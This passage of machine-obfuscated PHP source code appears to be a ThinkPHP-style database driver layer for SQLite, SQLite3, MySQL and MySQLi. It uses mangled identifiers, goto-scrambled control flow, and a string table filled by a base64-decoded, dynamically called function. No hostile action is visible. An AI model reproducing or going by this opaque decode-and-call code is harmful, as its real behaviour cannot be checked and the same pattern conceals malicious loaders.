loadClass($F¥¤†Á»Ö¥) { if (1 === func_num_args()) { $this->{$F¥¤†Á»Ö¥} = new $F¥¤†Á»Ö¥(); } else { $fØƒÉ‰™  = new ReflectionClass($F¥¤†Á»Ö¥); $C·©øÑ§ã… = func_get_args(); array_shift($C·©øÑ§ã…); $this->{$F¥¤†Á»Ö¥} = $fØƒÉ‰™ ->newInstanceArgs($C·©øÑ§ã…); } return $this->{$F¥¤†Á»Ö¥}; } protected function assign($F‹×¡¢†çí, $Aà”ùçõ) { $this->values[$F‹×¡¢†çí] = $Aà”ùçõ; } protected function display($bï«§¸ÇÂÌ) { ob_end_clean(); extract($this->values); require $this->tpl . $bï«§¸ÇÂÌ; } } class DbSqliteBase extends Db { public function __construct($E¾†¦•™»Í = '') { $A¼šˆ»ÜĞÒ =& $_SERVER[Â€Á›¨õ]; if (!extension_loaded($A¼šˆ»ÜĞÒ[9])) { think_exception(think_lang($A¼šˆ»ÜĞÒ[10]) . $A¼šˆ»ÜĞÒ[11]); } if (!empty($E¾†¦•™»Í)) { if (!isset($E¾†¦•™»Í[$A¼šˆ»ÜĞÒ[12]])) { $E¾†¦•™»Í[$A¼šˆ»ÜĞÒ[12]] = 438; } $this->config = $E¾†¦•™»Í; if (empty($this->config[$A¼šˆ»ÜĞÒ[13]])) { $this->config[$A¼šˆ»ÜĞÒ[13]] = array(); } } } public function connect($f¹òƒØùÂÚ = '', $Dµ×…ùƒõÌ = 0) { $fˆ¢Ãí™Ñ =& $_SERVER[Â€Á›¨õ]; if (!isset($this->linkID[$Dµ×…ùƒõÌ])) { goto Eğ×–ˆòÒ´; B¿ŒÀ‹ª‘»: $this->linkID[$Dµ×…ùƒõÌ] = $FÇËŠ¡ğ¼É($f¹òƒØùÂÚ[$fˆ¢Ãí™Ñ[17]], $f¹òƒØùÂÚ[$fˆ¢Ãí™Ñ[12]]); if (!$this->linkID[$Dµ×…ùƒõÌ]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto AïÜ…Ïø‰­; Eğ×–ˆòÒ´: if (empty($f¹òƒØùÂÚ)) { $f¹òƒØùÂÚ = $this->config; } $díÂ„«ÒÛ­ = !empty($f¹òƒØùÂÚ[$fˆ¢Ãí™Ñ[13]][$fˆ¢Ãí™Ñ[14]]) ? $f¹òƒØùÂÚ[$fˆ¢Ãí™Ñ[13]][$fˆ¢Ãí™Ñ[14]] : $this->pconnect; $FÇËŠ¡ğ¼É = $díÂ„«ÒÛ­ ? $fˆ¢Ãí™Ñ[15] : $fˆ¢Ãí™Ñ[16]; goto B¿ŒÀ‹ª‘»; AïÜ…Ïø‰­: @sqlite_busy_timeout($this->linkID[$Dµ×…ùƒõÌ], 30000); if (1 != think_config($fˆ¢Ãí™Ñ[18])) { unset($this->config); } goto BôÒ¼Ÿë‹; BôÒ¼Ÿë‹: } return $this->linkID[$Dµ×…ùƒõÌ]; } public function free() { $this->queryID = null; } public function query($aôµ÷Îù†) { goto E–¡äÉ‰”‹; Fàõê¾·œ—: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $eª†óíÕ¿ = $this->getAll(); return $eª†óíÕ¿; } goto C³‡™œå¤Ò; E–¡äÉ‰”‹: $A”ì—¹Ëõ• =& $_SERVER[Â€Á›¨õ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto DÊïØÉß¬ì; AæÜ’¿‹»: think_status($A”ì—¹Ëõ•[20]); $this->queryID = sqlite_query($this->_linkID, $aôµ÷Îù†); $this->debug(); goto Fàõê¾·œ—; DÊïØÉß¬ì: $this->queryStr = $aôµ÷Îù†; if ($this->queryID) { $this->free(); } think_action_status($A”ì—¹Ëõ•[19], 1); goto AæÜ’¿‹»; C³‡™œå¤Ò: } public function execute($DÎÃÙÆË…Ä) { goto f˜‰ªØ†; EÂ¦â‡ø…“: if (!1 === $D±Ç¡‰®«Ş) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto e‹‰Àä¯†ù; f˜‰ªØ†: $EŒî¾…­°„ =& $_SERVER[Â€Á›¨õ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto C‚¨Éà×ã½; cÀ·‘Æ‚øÓ: think_status($EŒî¾…­°„[20]); $D±Ç¡‰®«Ş = sqlite_exec($this->_linkID, $DÎÃÙÆË…Ä); $this->debug(); goto EÂ¦â‡ø…“; C‚¨Éà×ã½: $this->queryStr = $DÎÃÙÆË…Ä; if ($this->queryID) { $this->free(); } think_action_status($EŒî¾…­°„[21], 1); goto cÀ·‘Æ‚øÓ; e‹‰Àä¯†ù: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[Â€Á›¨õ][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $E”­µ× = sqlite_query($this->_linkID, $_SERVER[Â€Á›¨õ][23]); if (!$E”­µ×) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $FÈŸ…Ş—æ¹ = sqlite_query($this->_linkID, $_SERVER[Â€Á›¨õ][24]); if (!$FÈŸ…Ş—æ¹) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $e®å’ÔÖ¶ï = array(); if ($this->numRows > 0) { for ($F¥˜ƒ±ÃøÉ = 0; $F¥˜ƒ±ÃøÉ < $this->numRows; $F¥˜ƒ±ÃøÉ++) { $e®å’ÔÖ¶ï[$F¥˜ƒ±ÃøÉ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $e®å’ÔÖ¶ï; } public function getFields($b‹Óğ«ÕòÏ) { $cåô‡äãˆÏ =& $_SERVER[Â€Á›¨õ]; $dÏçÜ¬æİ× = $this->query($cåô‡äãˆÏ[25] . $b‹Óğ«ÕòÏ . $cåô‡äãˆÏ[26]); $F²›Š¹×Ô¤ = array(); if ($dÏçÜ¬æİ×) { foreach ($dÏçÜ¬æİ× as $bÁÁá¨ø°œ => $aÚñÆô–çÈ) { $F²›Š¹×Ô¤[$aÚñÆô–çÈ[$cåô‡äãˆÏ[27]]] = array($cåô‡äãˆÏ[28] => $aÚñÆô–çÈ[$cåô‡äãˆÏ[27]], $cåô‡äãˆÏ[29] => $aÚñÆô–çÈ[$cåô‡äãˆÏ[30]], $cåô‡äãˆÏ[31] => (bool) ($aÚñÆô–çÈ[$cåô‡äãˆÏ[32]] === $cåô‡äãˆÏ[33]), $cåô‡äãˆÏ[34] => $aÚñÆô–çÈ[$cåô‡äãˆÏ[35]], $cåô‡äãˆÏ[36] => strtolower($aÚñÆô–çÈ[$cåô‡äãˆÏ[37]]) == $cåô‡äãˆÏ[38], $cåô‡äãˆÏ[39] => strtolower($aÚñÆô–çÈ[$cåô‡äãˆÏ[40]]) == $cåô‡äãˆÏ[41]); } } return $F²›Š¹×Ô¤; } public function getTables($bÔ… ‰¨æ = '') { $e¥º¨ŠÁˆ =& $_SERVER[Â€Á›¨õ]; $b´‡èàë¬ = $this->query($e¥º¨ŠÁˆ[42] . $e¥º¨ŠÁˆ[43] . $e¥º¨ŠÁˆ[44]); $EÈÔÖ„Ş = array(); foreach ($b´‡èàë¬ as $bƒ’£ï¢¡ => $CÇ‹ç±™ì†) { $EÈÔÖ„Ş[$bƒ’£ï¢¡] = current($CÇ‹ç±™ì†); } return $EÈÔÖ„Ş; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $FÃÙ™§Ø¬ =& $_SERVER[Â€Á›¨õ]; $DÓøâñõˆ‡ = sqlite_last_error($this->_linkID); $this->error = $DÓøâñõˆ‡ . $FÃÙ™§Ø¬[4] . sqlite_error_string($DÓøâñõˆ‡); if ($FÃÙ™§Ø¬[33] != $this->queryStr) { $this->error .= LNG($FÃÙ™§Ø¬[45]) . $this->queryStr; } think_trace($this->error, $FÃÙ™§Ø¬[33], $FÃÙ™§Ø¬[46]); return $this->error; } public function escapeString($EñÛˆó) { return sqlite_escape_string($EñÛˆó); } public function parseLimit($eÄùÆ ô‹) { $DÏ¼³èÚˆ =& $_SERVER[Â€Á›¨õ]; $E¢ƒî•ËŠô = $DÏ¼³èÚˆ[33]; if (!empty($eÄùÆ ô‹)) { $eÄùÆ ô‹ = explode($DÏ¼³èÚˆ[47], $eÄùÆ ô‹); if (count($eÄùÆ ô‹) > 1) { $E¢ƒî•ËŠô .= $DÏ¼³èÚˆ[48] . $eÄùÆ ô‹[1] . $DÏ¼³èÚˆ[49] . $eÄùÆ ô‹[0] . $DÏ¼³èÚˆ[50]; } else { $E¢ƒî•ËŠô .= $DÏ¼³èÚˆ[48] . $eÄùÆ ô‹[0] . $DÏ¼³èÚˆ[50]; } } return $E¢ƒî•ËŠô; } } class DbSqlite3Base extends Db { public function __construct($AÛ×ó…¦ˆ = '') { $AË‚Œ©“ó =& $_SERVER[Â€Á›¨õ]; if (!class_exists($AË‚Œ©“ó[51])) { think_exception(think_lang($AË‚Œ©“ó[10]) . $AË‚Œ©“ó[52]); } if (!empty($AÛ×ó…¦ˆ)) { if (!isset($AÛ×ó…¦ˆ[$AË‚Œ©“ó[12]])) { $AÛ×ó…¦ˆ[$AË‚Œ©“ó[12]] = 438; } $this->config = $AÛ×ó…¦ˆ; if (empty($this->config[$AË‚Œ©“ó[13]])) { $this->config[$AË‚Œ©“ó[13]] = array(); } } } public function connect($F¢Ş«§„â = '', $AèºæÅïè˜ = 0) { $D¶„‰Ó¯°£ =& $_SERVER[Â€Á›¨õ]; if (!isset($this->linkID[$AèºæÅïè˜])) { if (empty($F¢Ş«§„â)) { $F¢Ş«§„â = $this->config; } $this->linkID[$AèºæÅïè˜] = new SQLite3($F¢Ş«§„â[$D¶„‰Ó¯°£[17]]); if (!$this->linkID[$AèºæÅïè˜]) { think_exception($this->linkID[$AèºæÅïè˜]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$AèºæÅïè˜]->busyTimeout(30000); if (1 != think_config($D¶„‰Ó¯°£[18])) { unset($this->config); } } return $this->linkID[$AèºæÅïè˜]; } public function free() { $this->queryID = null; } public function query($Bë×Û½©›±) { goto FËæª˜„´Ò; D¹¬…‹Ã‘è: if (!1 === $this->queryID) { $this->error(); return !1; } else { $A¼ñÙÚ´ô’ = $this->getAll(); $this->numRows = count($A¼ñÙÚ´ô’); return $A¼ñÙÚ´ô’; } goto cÀ—òÊè©Œ; F¡»·×¦…: $this->queryStr = $Bë×Û½©›±; if ($this->queryID) { $this->free(); } think_action_status($eó¿¤ƒ±”ó[19], 1); goto cŠÆ¡íƒ½Ò; cŠÆ¡íƒ½Ò: think_status($eó¿¤ƒ±”ó[20]); $this->queryID = $this->_linkID->query($Bë×Û½©›±); $this->debug(); goto D¹¬…‹Ã‘è; FËæª˜„´Ò: $eó¿¤ƒ±”ó =& $_SERVER[Â€Á›¨õ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto F¡»·×¦…; cÀ—òÊè©Œ: } public function execute($aƒËæ³‘—) { goto e ÙÒêŞ×Ï; fÓ„ƒÔÈÜì: $this->queryStr = $aƒËæ³‘—; if ($this->queryID) { $this->free(); } think_action_status($aÈÏï‹„Ùƒ[21], 1); goto eÚ ©ƒ”Ú¯; eÚ ©ƒ”Ú¯: think_status($aÈÏï‹„Ùƒ[20]); $E‚Ñ„Àë¿Å = $this->_linkID->exec($aƒËæ³‘—); $this->debug(); goto eæ›Åø«Âì; eæ›Åø«Âì: if (!1 === $E‚Ñ„Àë¿Å) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto d‹Ï£¨¥ˆ; e ÙÒêŞ×Ï: $aÈÏï‹„Ùƒ =& $_SERVER[Â€Á›¨õ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto fÓ„ƒÔÈÜì; d‹Ï£¨¥ˆ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[Â€Á›¨õ][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $bŠ›ìÒ°Æ = $this->_linkID->query($_SERVER[Â€Á›¨õ][23]); if (!$bŠ›ìÒ°Æ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $DÙ®¯äì¬Ú = $this->_linkID->query($_SERVER[Â€Á›¨õ][24]); if (!$DÙ®¯äì¬Ú) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Aéï²Ç³á = array(); while ($BÀæİÛŞÀ÷ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $Aéï²Ç³á[] = $BÀæİÛŞÀ÷; } $this->queryID->reset(); return $Aéï²Ç³á; } public function getFields($c¼ƒ¬‰ùõİ) { $fæš«°·Ñ =& $_SERVER[Â€Á›¨õ]; $A¤”×§ = $this->query($fæš«°·Ñ[25] . $c¼ƒ¬‰ùõİ . $fæš«°·Ñ[26]); $f”ÊÔˆ”“ = array(); if ($A¤”×§) { foreach ($A¤”×§ as $Eñ¨“óŠ„„ => $e¥†À×¤¾¦) { $f”ÊÔˆ”“[$e¥†À×¤¾¦[$fæš«°·Ñ[28]]] = array($fæš«°·Ñ[28] => $e¥†À×¤¾¦[$fæš«°·Ñ[28]], $fæš«°·Ñ[29] => $e¥†À×¤¾¦[$fæš«°·Ñ[29]], $fæš«°·Ñ[31] => (bool) ($e¥†À×¤¾¦[$fæš«°·Ñ[31]] === $fæš«°·Ñ[33]), $fæš«°·Ñ[34] => $e¥†À×¤¾¦[$fæš«°·Ñ[53]], $fæš«°·Ñ[36] => (bool) $e¥†À×¤¾¦[$fæš«°·Ñ[54]], $fæš«°·Ñ[39] => (bool) $e¥†À×¤¾¦[$fæš«°·Ñ[54]]); } } return $f”ÊÔˆ”“; } public function getTables($a¼¿­˜ñôĞ = '') { $CÈ—’’ÃõÃ =& $_SERVER[Â€Á›¨õ]; $E…Ÿ¯çßÂô = $this->query($CÈ—’’ÃõÃ[42] . $CÈ—’’ÃõÃ[43] . $CÈ—’’ÃõÃ[44]); $A™‘ÏáÍŒ = array(); foreach ($E…Ÿ¯çßÂô as $BÛˆ…¯ÕôŠ => $a¡Œ­Ó‡âÂ) { $A™‘ÏáÍŒ[$BÛˆ…¯ÕôŠ] = current($a¡Œ­Ó‡âÂ); } return $A™‘ÏáÍŒ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $d±µøäˆ¡¹ =& $_SERVER[Â€Á›¨õ]; $this->error = $this->_linkID->lastErrorMsg(); if ($d±µøäˆ¡¹[33] != $this->queryStr) { $this->error .= LNG($d±µøäˆ¡¹[45]) . $this->queryStr; } think_trace($this->error, $d±µøäˆ¡¹[33], $d±µøäˆ¡¹[46]); return $this->error; } public function escapeString($a³œ¢¸¼Š ) { $FÃß‘¶¶¹ =& $_SERVER[Â€Á›¨õ]; if ($this->_linkID) { return $this->_linkID->escapeString($a³œ¢¸¼Š ); } return str_ireplace($FÃß‘¶¶¹[55], $FÃß‘¶¶¹[56], $a³œ¢¸¼Š ); } public function parseLimit($bõ®íßÌÛ£) { $AãÁ„²ïˆã =& $_SERVER[Â€Á›¨õ]; $B†£ÉŒ•»¹ = $AãÁ„²ïˆã[33]; if (!empty($bõ®íßÌÛ£)) { $bõ®íßÌÛ£ = explode($AãÁ„²ïˆã[47], $bõ®íßÌÛ£); if (count($bõ®íßÌÛ£) > 1) { $B†£ÉŒ•»¹ .= $AãÁ„²ïˆã[48] . $bõ®íßÌÛ£[1] . $AãÁ„²ïˆã[49] . $bõ®íßÌÛ£[0] . $AãÁ„²ïˆã[50]; } else { $B†£ÉŒ•»¹ .= $AãÁ„²ïˆã[48] . $bõ®íßÌÛ£[0] . $AãÁ„²ïˆã[50]; } } return $B†£ÉŒ•»¹; } } goto F¾§¢¿»·”; a„À¹ËäÔò: $aôÚˆóÑ’ = strrev(base64_decode($_SERVER[ÏÕ‘àëˆÅª][0])); function binCheckNeq($BöŞëŒ•Ø, $fÅ×æ°ïî°) { return $BöŞëŒ•Ø != $fÅ×æ°ïî°; } $_SERVER[$_SERVER[ÏÕ‘àëˆÅª][1]] = $aôÚˆóÑ’($_SERVER[$_SERVER[ÏÕ‘àëˆÅª][2]]); goto cŸ×Éˆ¸÷ƒ; F•±÷ŒëÛ: class DbMysql extends Db { public function __construct($DÕ‰÷ÈßâÕ = '') { $bŒùñöï® =& $_SERVER[Â€Á›¨õ]; if (!extension_loaded($bŒùñöï®[742])) { think_exception(think_lang($bŒùñöï®[10]) . $bŒùñöï®[820]); } if (!empty($DÕ‰÷ÈßâÕ)) { $this->config = $DÕ‰÷ÈßâÕ; if (empty($this->config[$bŒùñöï®[13]])) { $this->config[$bŒùñöï®[13]] = $bŒùñöï®[33]; } } } public function connect($bÎğĞ¤ÕÁ· = '', $FåĞ‚Œ£ö÷ = 0, $dŸÒ×‹Ë‘„ = false) { $eà™¼¿ÛÈ =& $_SERVER[Â€Á›¨õ]; if (!isset($this->linkID[$FåĞ‚Œ£ö÷])) { goto fÙó—Ğ°Üí; d°ğƒãÕšã: mysql_query($eà™¼¿ÛÈ[825] . think_config($eà™¼¿ÛÈ[826]) . $eà™¼¿ÛÈ[55], $this->linkID[$FåĞ‚Œ£ö÷]); if ($fœè§éØ¬½ > $eà™¼¿ÛÈ[827]) { mysql_query($eà™¼¿ÛÈ[828], $this->linkID[$FåĞ‚Œ£ö÷]); } $this->connected = !0; goto c”§¹¢ò­¢; fÙó—Ğ°Üí: if (empty($bÎğĞ¤ÕÁ·)) { $bÎğĞ¤ÕÁ· = $this->config; } $B—Î·Ô†âÓ = $bÎğĞ¤ÕÁ·[$eà™¼¿ÛÈ[821]] . ($bÎğĞ¤ÕÁ·[$eà™¼¿ÛÈ[822]] ? "\72{$bÎğĞ¤ÕÁ·[$eà™¼¿ÛÈ[822]]}" : $eà™¼¿ÛÈ[33]); $dª®¬ÃÑé = !empty($bÎğĞ¤ÕÁ·[$eà™¼¿ÛÈ[13]][$eà™¼¿ÛÈ[14]]) ? $bÎğĞ¤ÕÁ·[$eà™¼¿ÛÈ[13]][$eà™¼¿ÛÈ[14]] : $this->pconnect; goto eÜ Ÿ†ì‚Ä; eÜ Ÿ†ì‚Ä: if ($dª®¬ÃÑé) { $this->linkID[$FåĞ‚Œ£ö÷] = mysql_pconnect($B—Î·Ô†âÓ, $bÎğĞ¤ÕÁ·[$eà™¼¿ÛÈ[823]], $bÎğĞ¤ÕÁ·[$eà™¼¿ÛÈ[824]], 131072); } else { $this->linkID[$FåĞ‚Œ£ö÷] = mysql_connect($B—Î·Ô†âÓ, $bÎğĞ¤ÕÁ·[$eà™¼¿ÛÈ[823]], $bÎğĞ¤ÕÁ·[$eà™¼¿ÛÈ[824]], !0, 131072); } if (!$this->linkID[$FåĞ‚Œ£ö÷] || !empty($bÎğĞ¤ÕÁ·[$eà™¼¿ÛÈ[17]]) && !mysql_select_db($bÎğĞ¤ÕÁ·[$eà™¼¿ÛÈ[17]], $this->linkID[$FåĞ‚Œ£ö÷])) { think_exception(mysql_error()); } $fœè§éØ¬½ = mysql_get_server_info($this->linkID[$FåĞ‚Œ£ö÷]); goto d°ğƒãÕšã; c”§¹¢ò­¢: if (1 != think_config($eà™¼¿ÛÈ[18])) { unset($this->config); } goto a®â¹·‘‹‰; a®â¹·‘‹‰: } return $this->linkID[$FåĞ‚Œ£ö÷]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($c”ô˜¶Öƒ) { goto d˜‹†—Áİœ; C¨â ìßä: if (!$this->_linkID) { return !1; } $this->queryStr = $c”ô˜¶Öƒ; if ($this->queryID) { $this->free(); } goto F™äÔ‰ŠÄ; F™äÔ‰ŠÄ: think_action_status($CÀµ†Ö£ÛÓ[19], 1); think_status($CÀµ†Ö£ÛÓ[20]); $this->queryID = mysql_query($c”ô˜¶Öƒ, $this->_linkID); goto aéÀ¹íğ·; aéÀ¹íğ·: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto BÑç¬Óòø; d˜‹†—Áİœ: $CÀµ†Ö£ÛÓ =& $_SERVER[Â€Á›¨õ]; if (0 === stripos($c”ô˜¶Öƒ, $CÀµ†Ö£ÛÓ[260])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto C¨â ìßä; BÑç¬Óòø: } public function execute($DŠíŒëíÜå) { goto d˜Ù¾æ¯¿‡; BÈ›ÁàæÛÍ: $this->queryStr = $DŠíŒëíÜå; if ($this->queryID) { $this->free(); } think_action_status($eõØéñìÚ[21], 1); goto dŸë÷ƒê¾ö; dŸë÷ƒê¾ö: think_status($eõØéñìÚ[20]); $E¦ŒÂ¾Ãö = mysql_query($DŠíŒëíÜå, $this->_linkID); $this->debug(); goto f®ê‡Ê¯¥; f®ê‡Ê¯¥: if (!1 === $E¦ŒÂ¾Ãö) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto FÊÅ×°â­; d˜Ù¾æ¯¿‡: $eõØéñìÚ =& $_SERVER[Â€Á›¨õ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto BÈ›ÁàæÛÍ; FÊÅ×°â­: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[Â€Á›¨õ][829], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $dº‡ªº†„¿ = mysql_query($_SERVER[Â€Á›¨õ][830], $this->_linkID); $this->transTimes = 0; if (!$dº‡ªº†„¿) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $a÷ô‰«ñ = mysql_query($_SERVER[Â€Á›¨õ][831], $this->_linkID); $this->transTimes = 0; if (!$a÷ô‰«ñ) { $this->error(); return !1; } } return !0; } private function getAll() { $b´×–Ìø› = array(); if ($this->numRows > 0) { while ($C¸ÖãÎ¯ˆ’ = mysql_fetch_assoc($this->queryID)) { $b´×–Ìø›[] = $C¸ÖãÎ¯ˆ’; } mysql_data_seek($this->queryID, 0); } return $b´×–Ìø›; } public function getFields($f÷Œ§¶¯İ×) { $e‰»®·Áç =& $_SERVER[Â€Á›¨õ]; $fÑÒ¯‹ï– = $this->query($e‰»®·Áç[832] . $this->parseKey($f÷Œ§¶¯İ×)); $Dßãç°¶® = array(); if ($fÑÒ¯‹ï–) { foreach ($fÑÒ¯‹ï– as $b†î”Ü¤»ä => $d»¬Î¼Ê) { $Dßãç°¶®[$d»¬Î¼Ê[$e‰»®·Áç[27]]] = array($e‰»®·Áç[28] => $d»¬Î¼Ê[$e‰»®·Áç[27]], $e‰»®·Áç[29] => $d»¬Î¼Ê[$e‰»®·Áç[30]], $e‰»®·Áç[31] => (bool) (strtoupper($d»¬Î¼Ê[$e‰»®·Áç[32]]) === $e‰»®·Áç[833]), $e‰»®·Áç[34] => $d»¬Î¼Ê[$e‰»®·Áç[35]], $e‰»®·Áç[36] => strtolower($d»¬Î¼Ê[$e‰»®·Áç[37]]) == $e‰»®·Áç[38], $e‰»®·Áç[39] => strtolower($d»¬Î¼Ê[$e‰»®·Áç[40]]) == $e‰»®·Áç[41]); } } return $Dßãç°¶®; } public function getTables($D«£ÖğÍÛµ = '') { $a¤ï™‹‹´Ù =& $_SERVER[Â€Á›¨õ]; if (!empty($D«£ÖğÍÛµ)) { $BéŒ×âõ´ = $a¤ï™‹‹´Ù[834] . $D«£ÖğÍÛµ . $a¤ï™‹‹´Ù[835]; } else { $BéŒ×âõ´ = $a¤ï™‹‹´Ù[836]; } $B˜È…ºæá¯ = $this->query($BéŒ×âõ´); $fÛÃÕ§Ô = array(); foreach ($B˜È…ºæá¯ as $c„Ş•‡Ô‚Ö => $e´œ¤±¹­ê) { $fÛÃÕ§Ô[$c„Ş•‡Ô‚Ö] = current($e´œ¤±¹­ê); } return $fÛÃÕ§Ô; } public function replace($bƒ«’†­–, $B…ÊÕë«É« = array()) { $C›Í¯ä—¾Ç =& $_SERVER[Â€Á›¨õ]; foreach ($bƒ«’†­– as $CŒ¶ø–šÕ => $A±÷×ë¼“š) { $C¼©‡È·åÖ = $this->parseValue($A±÷×ë¼“š); if (is_scalar($C¼©‡È·åÖ)) { $fÉ°éˆ¤ºè[] = $C¼©‡È·åÖ; $E‡ïˆë·…[] = $this->parseKey($CŒ¶ø–šÕ); } } $AÆÚ‰İÖÄÆ = $C›Í¯ä—¾Ç[837] . $this->parseTable($B…ÊÕë«É«[$C›Í¯ä—¾Ç[275]]) . $C›Í¯ä—¾Ç[838] . implode($C›Í¯ä—¾Ç[47], $E‡ïˆë·…) . $C›Í¯ä—¾Ç[839] . implode($C›Í¯ä—¾Ç[47], $fÉ°éˆ¤ºè) . $C›Í¯ä—¾Ç[840]; return $this->execute($AÆÚ‰İÖÄÆ); } public function insertAll($dëà‘ÅëÃˆ, $d‹ƒÔØ­¾‡ = array(), $AëÍÎÇ§âÃ = false) { goto c–ÙÀùŠ¤Â; a–£İĞğ: $AøÉ©éïÌ = array(); foreach ($dëà‘ÅëÃˆ as $a›¶ÅÜöÊ¥) { $eÆ•ÍøØÏË = array(); foreach ($a›¶ÅÜöÊ¥ as $dîÑ·ä‹Šƒ => $b‚á®Ï¦¥«) { $b‚á®Ï¦¥« = $this->parseValue($b‚á®Ï¦¥«); if (is_scalar($b‚á®Ï¦¥«)) { $eÆ•ÍøØÏË[] = $b‚á®Ï¦¥«; } } $AøÉ©éïÌ[] = $fä¥‘ÏËöä[256] . implode($fä¥‘ÏËöä[47], $eÆ•ÍøØÏË) . $fä¥‘ÏËöä[840]; } array_walk($D•›Ş‹ã·ç, array($this, $fä¥‘ÏËöä[841])); goto BèÎ’š†•Œ; c–ÙÀùŠ¤Â: $fä¥‘ÏËöä =& $_SERVER[Â€Á›¨õ]; if (!is_array($dëà‘ÅëÃˆ[0])) { return !1; } $D•›Ş‹ã·ç = array_keys($dëà‘ÅëÃˆ[0]); goto a–£İĞğ; BèÎ’š†•Œ: $E·‹»¶Ïàõ = ($AëÍÎÇ§âÃ ? $fä¥‘ÏËöä[842] : $fä¥‘ÏËöä[843]) . $fä¥‘ÏËöä[844] . $this->parseTable($d‹ƒÔØ­¾‡[$fä¥‘ÏËöä[275]]) . $fä¥‘ÏËöä[838] . implode($fä¥‘ÏËöä[47], $D•›Ş‹ã·ç) . $fä¥‘ÏËöä[845] . implode($fä¥‘ÏËöä[47], $AøÉ©éïÌ); return $this->execute($E·‹»¶Ïàõ); goto F˜øë¤ÁÍå; F˜øë¤ÁÍå: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $EÌÉ˜¯±Í˜ =& $_SERVER[Â€Á›¨õ]; $this->error = mysql_errno() . $EÌÉ˜¯±Í˜[4] . mysql_error($this->_linkID); if ($EÌÉ˜¯±Í˜[33] != $this->queryStr) { $this->error .= LNG($EÌÉ˜¯±Í˜[45]) . $this->queryStr; } think_trace($this->error, $EÌÉ˜¯±Í˜[33], $EÌÉ˜¯±Í˜[46]); return $this->error; } public function escapeString($C‹Ûœ…ÙÍ) { if ($this->_linkID) { return mysql_real_escape_string($C‹Ûœ…ÙÍ, $this->_linkID); } else { return mysql_escape_string($C‹Ûœ…ÙÍ); } } public function parseKey(&$Aòö ­ôƒ, $cá¹’õ¦ô = true) { $c³ˆÄµ¬‹ =& $_SERVER[Â€Á›¨õ]; if ($cá¹’õ¦ô) { $Aòö ­ôƒ = $this->parseKeyCheck($Aòö ­ôƒ); } if ($Aòö ­ôƒ != $c³ˆÄµ¬‹[182] && !preg_match($c³ˆÄµ¬‹[846], $Aòö ­ôƒ)) { $Aòö ­ôƒ = $c³ˆÄµ¬‹[380] . trim($Aòö ­ôƒ, $c³ˆÄµ¬‹[380]) . $c³ˆÄµ¬‹[380]; } return $Aòö ­ôƒ; } } class DbMysqli extends Db { public function __construct($dÜÂ†ßÒ¶ = '') { $bÌß»á­ã™ =& $_SERVER[Â€Á›¨õ]; if (!extension_loaded($bÌß»á­ã™[741])) { think_exception(think_lang($bÌß»á­ã™[10]) . $bÌß»á­ã™[847]); } if (!empty($dÜÂ†ßÒ¶)) { $this->config = $dÜÂ†ßÒ¶; if (empty($this->config[$bÌß»á­ã™[13]])) { $this->config[$bÌß»á­ã™[13]] = $bÌß»á­ã™[33]; } } } public function connect($b®Úäë¢ = '', $fÖùç÷Áµ = 0) { $b•ÖÃï =& $_SERVER[Â€Á›¨õ]; if (!isset($this->linkID[$fÖùç÷Áµ])) { goto C­©£‚¨é; A©’äùÔ”: $this->connected = !0; if (1 != think_config($b•ÖÃï[18])) { unset($this->config); } goto e»•ÚÉ‚; a¯†™ñ¶‰…: $cˆôø‚¢Ğ = $this->linkID[$fÖùç÷Áµ]->server_version; $this->linkID[$fÖùç÷Áµ]->query($b•ÖÃï[825] . think_config($b•ÖÃï[826]) . $b•ÖÃï[55]); if ($cˆôø‚¢Ğ > $b•ÖÃï[827]) { $this->linkID[$fÖùç÷Áµ]->query($b•ÖÃï[828]); } goto A©’äùÔ”; C­©£‚¨é: if (empty($b®Úäë¢)) { $b®Úäë¢ = $this->config; } $this->linkID[$fÖùç÷Áµ] = new mysqli($b®Úäë¢[$b•ÖÃï[821]], $b®Úäë¢[$b•ÖÃï[823]], $b®Úäë¢[$b•ÖÃï[824]], $b®Úäë¢[$b•ÖÃï[17]], 